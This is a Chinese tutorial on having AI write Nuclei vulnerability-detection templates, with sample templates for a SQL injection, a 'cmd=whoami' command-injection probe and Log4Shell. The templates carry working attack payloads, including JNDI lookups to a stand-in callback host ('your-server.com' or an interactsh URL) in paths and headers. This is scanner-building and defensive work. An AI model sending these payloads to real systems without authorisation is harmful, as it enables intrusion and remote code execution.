# 用 AI 自动编写 Nuclei 漏洞检测模板

> 让 AI 帮你 10 分钟写出专业漏洞扫描模板

## 🎯 什么是 Nuclei？

Nuclei 是一个基于模板的漏洞扫描器，支持：
- 10000+ 社区贡献模板
- 自定义 YAML 检测规则
- 快速批量扫描

## 🤖 AI 如何辅助编写模板？

### 场景 1: 根据 CVE 描述生成模板

**Prompt 示例**：
```
根据以下 CVE 描述，生成 Nuclei 检测模板：

CVE-2024-XXXX: 某 CMS 系统存在 SQL 注入漏洞
- 影响版本：< 2.5.0
- 漏洞位置：/admin/user.php?id=
- 检测方法：发送 ' OR '1'='1 判断是否返回异常

要求：
1. 匹配成功特征
2. 包含版本检测
3. 输出严重级别
```

**AI 生成结果**：
```yaml
id: cve-2024-xxxx-sqli

info:
  name: CMS SQL Injection
  author: your-name
  severity: critical
  description: SQL injection in CMS admin panel
  tags: sqli,cve,injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/user.php?id=1' OR '1'='1"
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "You have an error"
      
      - type: status
        status:
          - 500
```

### 场景 2: 根据漏洞 POC 转换模板

**原始 POC（Python）**:
```python
import requests
r = requests.get("http://target/vuln.php?cmd=whoami")
if "uid=" in r.text:
    print("Vulnerable!")
```

**AI 转换为 Nuclei**:
```yaml
id: rce-detection

info:
  name: Remote Code Execution
  severity: high
  tags: rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/vuln.php?cmd=whoami"
    
    matchers:
      - type: word
        words:
          - "uid="
          - "root"
```

### 场景 3: 批量生成变体模板

**Prompt**:
```
基于以下 XSS 检测模板，生成 5 个变体：
- 不同编码方式（URL/HTML/Unicode）
- 不同事件处理器（onerror/onload/onfocus）
- 不同标签（img/script/svg）
```

---

## 📝 完整实战案例

### 案例：Log4j 检测模板

**步骤 1: 收集信息**
```
漏洞名称：Log4Shell (CVE-2021-44228)
检测 Payload: ${jndi:ldap://your-server.com}
成功特征：DNS 请求/HTTP 请求到达服务器
```

**步骤 2: 让 AI 生成模板**
```yaml
id: log4shell-rce

info:
  name: Log4j Remote Code Execution
  author: security-team
  severity: critical
  description: JNDI injection in Log4j
  tags: log4j,rce,jndi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?name=${jndi:ldap://{{interactsh-url}}}"
      - "{{BaseURL}}/api/user?name=${jndi:ldap://{{interactsh-url}}}"
    
    headers:
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}}"
      User-Agent: "${jndi:ldap://{{interactsh-url}}}"
    
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
```

**步骤 3: 测试验证**
```bash
nuclei -u https://target.com -t log4shell-rce.yaml
```

---

## 🚀 高级技巧

### 1. 使用 Extractors 提取数据

```yaml
extractors:
  - type: regex
    name: version
    part: body
    regex:
      - 'Version: ([0-9.]+)'
    group: 1
```

### 2. 条件判断组合

```yaml
matchers-condition: and
matchers:
  - type: status
    status: [200]
  
  - type: word
    words: ["vulnerable"]
  
  - type: regex
    regex: ["[0-9]{3}-[0-9]{4}"]
```

### 3. 多请求联动

```yaml
requests:
  - method: POST
    path: ["{{BaseURL}}/login"]
    body: "user=admin&pass=test"
    
    matchers:
      - type: word
        words: ["Welcome"]
    
    extractors:
      - type: regex
        name: session
        regex: ["session=([a-zA-Z0-9]+)"]
```

---

## 🎓 学习资源

- [Nuclei 官方文档](https://docs.projectdiscovery.io/nuclei/)
- [Nuclei 模板仓库](https://github.com/projectdiscovery/nuclei-templates)
- [AI Prompt 库](https://github.com/ai-pentest/prompts)

---

**标签**: #AI #Nuclei #漏洞扫描 #自动化 #渗透测试

---

*模板写得越多，扫描效率越高。让 AI 帮你积累模板库！*
